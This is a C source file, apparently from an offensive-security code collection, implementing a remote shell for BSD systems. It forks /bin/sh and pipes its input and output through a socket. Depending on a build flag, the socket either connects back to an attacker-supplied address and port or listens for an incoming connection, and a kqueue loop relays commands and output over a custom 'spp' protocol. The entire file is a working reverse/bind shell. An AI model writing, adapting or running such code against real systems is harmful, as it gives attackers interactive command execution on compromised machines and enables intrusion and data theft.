/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/event.h>
#include <sys/mman.h>
#include <errno.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include "spp.h"

//#define HTONS(x) ((((uint16_t)(x) & 0xff00) >> 8) | (((uint16_t)(x) & 0x00ff) << 8))

typedef struct sc_properties_t {
  union {
    int pipes[4];
    struct {
      int in[2], out[2];
    };
  };
  pid_t         pid;
  int           kq, h[2];
  struct kevent fdlist[2];
  struct kevent evlist[2];  
  spp_blk       x; 
  spp_ctx       c;  
} p_tbl;

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int                i, r, nev, flgs, end;
    p_tbl              p;
    char               *pargv[2];

    memset(&p, 0, sizeof(p));
            
    // create pipes for redirection of stdin/stdout/stderr
    syscall(SYS_pipe,  p.in);
    syscall(SYS_pipe, p.out);

    // execute /bin/sh as child process
    p.pid = syscall(SYS_fork);
    
    if (!p.pid) 
    {
      // assign read end to stdin
      syscall(SYS_dup2,  p.in[0], STDIN_FILENO );
      // assign write end to stdout   
      syscall(SYS_dup2, p.out[1], STDOUT_FILENO);
      // assign write end to stderr  
      syscall(SYS_dup2, p.out[1], STDERR_FILENO);  
      
      syscall(SYS_close, p.in[0]);
      syscall(SYS_close, p.in[1]);
      
      syscall(SYS_close, p.out[0]);
      syscall(SYS_close, p.out[1]);
      
      pargv[0] = "/bin/sh";
      pargv[1] = NULL;
      
      syscall(SYS_execve, "/bin/sh", pargv, NULL);
    } else {      
      syscall(SYS_close,  p.in[0]); // close read end
      syscall(SYS_close, p.out[1]); // close write end
      
      // create a socket
      p.c.s = syscall(SYS_socket, AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family      = AF_INET;
      sa.sin_port        = htons(atoi(argv[2]));
      sa.sin_addr.s_addr = inet_addr(argv[1]);

			#ifdef CONNECT
        // attempt connection to remote host
        r = syscall(SYS_connect, p.c.s, (struct sockaddr*)&sa, sizeof(sa));
      #else
				syscall(SYS_bind, p.c.s, (struct sockaddr*)&sa, sizeof(sa));
			  syscall(SYS_listen, p.c.s, 0);
				r = syscall(SYS_accept, p.c.s, 0, 0);
			#endif
		
      if (!r)
      {
        // create new kqueue
        if ((p.kq = syscall(SYS_kqueue)) > 0) 
        {        
          // structure for socket
          // notifies when data available to read
          EV_SET(&p.fdlist[0], p.c.s, EVFILT_READ, 
              EV_ADD | EV_CLEAR, 0, 0, NULL);
          
          // structure for stdout/stderr  
          EV_SET(&p.fdlist[1], p.out[0], EVFILT_READ, 
              EV_ADD | EV_CLEAR, 0, 0, NULL);
        
          for (end=0; !end;)
          {
            // register for 2 descriptors with kqueue
            // no timeout specified
            nev = syscall(SYS_kevent, p.kq, p.fdlist, 2, p.evlist, 2, NULL);
          
            // zero would indicate timeout, -1 indicates error
            if (nev <= 0) {
              break;
            }
            
            for (i=0; i<nev; i++)
            {
              flgs = p.evlist[i].flags;
              
              if (flgs & EV_EOF) {
                end=1;
                break;
              }
              if (flgs & EV_ERROR) {             
                end=1;
                break;
              }
              if (p.evlist[i].ident == p.c.s)
              {
                // receive incoming data
                if (spp_recv(&p.c, &p.x) != SPP_ERR_OK) {
                  end=1;
                  break;
                }     
                syscall(SYS_write, p.in[1], p.x.data.b, p.x.len.w);
              } else if (p.evlist[i].ident == p.out[0])
              {
                p.x.len.w = syscall(SYS_read, p.out[0], p.x.data.b, SPP_BLK_LEN);
                // send to remote peer
                if (spp_send(&p.c, &p.x) != SPP_ERR_OK) {
                  end=1;
                  break;
                }
              }
            } // end for
          } // end for
          syscall(SYS_close, p.kq);
        } else {
          printf("kqueue error\n");
        }
      } else printf("\nconnect error");
      syscall(SYS_kill, p.pid, SIGCHLD);
      syscall(SYS_shutdown, p.c.s, SHUT_RDWR);
      syscall(SYS_close, p.c.s);
    }
    syscall(SYS_close, p.in[1]);
    syscall(SYS_close, p.out[0]);		
    syscall(SYS_exit, 0);  
}
    
